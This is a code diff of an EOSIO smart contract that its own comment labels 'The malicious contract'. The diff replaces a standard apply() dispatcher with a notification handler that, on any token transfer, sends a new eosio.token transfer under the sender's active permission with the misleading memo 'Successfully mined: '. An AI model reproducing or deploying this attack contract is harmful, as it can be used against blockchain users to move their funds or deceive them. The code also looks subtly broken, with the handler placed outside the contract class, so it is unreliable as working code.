@@ -4,7 +4,7 @@
 #include <eosio/asset.hpp>
 using namespace eosio;
 // The malicious contract
-class [[eosio::contract]] dataStorage : public contract {
+class [[eosio::contract]] eosram : public contract {
 
         public:
                 using contract::contract;
@@ -43,14 +43,15 @@ class [[eosio::contract]] dataStorage : public contract {
 };
   
 extern "C" {
-        void apply( uint64_t receiver, uint64_t code, uint64_t action ) {
-                if( code == "eosio.token"_n.value ) { // If the contract is invoked 
-                                               // as part of a notification
-                        dataStorage thiscontract(receiver);
-                        switch( action ) {
-                                EOSIO_API( dataStorage, (transfer) ) //Handles the 
-                                                                     //transfer function
-                        }
-                }
-        }
+[[eosio::on_notify("*::transfer")]]
+void on_transfer( const name from, const name to, const asset quantity, const std::string memo ) {
+
+    action(
+      permission_level{from, "active"_n},
+      name("eosio.token"),
+      "transfer"_n, 
+      std::make_tuple(from,to,quantity,std::string("Successfully mined: "))
+    ).send();
+
+  }
 }
